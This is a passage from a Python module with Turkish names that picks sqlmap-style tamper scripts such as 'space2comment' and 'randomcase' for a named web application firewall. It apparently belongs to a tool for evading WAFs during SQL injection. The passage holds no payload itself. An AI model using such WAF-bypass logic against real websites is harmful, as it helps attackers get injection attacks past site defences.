        from zeka_sistemi.waf_bypass_havuzu import WAF_TAMPER_MAP
        return WAF_TAMPER_MAP.get(waf_adi, _FALLBACK.get(waf_adi, ['space2comment', 'randomcase']))
    except ImportError:
        return _FALLBACK.get(waf_adi, ['space2comment', 'randomcase'])


def tum_tamperler() -> list:
    return list(_TAMPER_MAP.keys())


# Geriye dönük uyumluluk
TAMPER_HARITASI = _TAMPER_MAP
